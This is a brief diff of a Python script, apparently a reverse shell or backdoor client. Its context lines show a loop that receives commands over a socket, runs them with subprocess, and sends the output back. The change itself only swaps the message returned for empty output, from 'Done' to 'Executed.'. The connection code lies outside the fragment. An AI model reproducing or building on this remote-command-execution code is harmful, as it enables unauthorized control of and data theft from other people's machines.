@@ -16,6 +16,6 @@ while True:
         break
     output = subprocess.getoutput(command)
     if output == "":
-        output = "Done"
+        output = "Executed."
     s.send(output.encode())
 s.close()
